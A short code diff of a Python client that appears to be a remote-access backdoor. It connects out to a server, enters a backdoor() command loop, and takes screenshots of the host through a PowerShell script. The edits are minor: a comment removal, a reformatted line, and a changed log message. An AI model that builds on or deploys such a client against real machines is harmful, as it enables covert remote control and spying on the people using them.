@@ -18,8 +18,6 @@ from tasks import Tasks
 from freestyle import Freestyle
 
 
-# TODO: Move all command files to result lists
-
 class Client:
     def __init__(self, server, main_path, log_path):
         self.threads = []
@@ -222,8 +220,7 @@ class Client:
                     elif str(command.lower())[:6] == "screen":
                         self.logIt_thread(log_path, msg='Initiating screenshot class...')
                         self.ps_path = rf"C:\Peach\screenshot.ps1"
-                        screenshot = Screenshot(soc, self.log_path,
-                                                self.hostname, self.localIP, self.ps_path)
+                        screenshot = Screenshot(soc, log_path, self.hostname, self.localIP, self.ps_path)
 
                         self.logIt_thread(log_path, msg='Calling screenshot.run()...')
                         screenshot.run()
@@ -374,7 +371,7 @@ if __name__ == "__main__":
                 soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                 client.logIt_thread(log_path, msg=f'connecting to {server}...')
                 soc.connect(server)
-                client.logIt_thread(log_path, msg=f'Calling backdoor()...')
+                client.logIt_thread(log_path, msg=f'Calling backdoor({soc})...')
                 client.backdoor(soc)
 
             except (WindowsError, socket.error) as e:
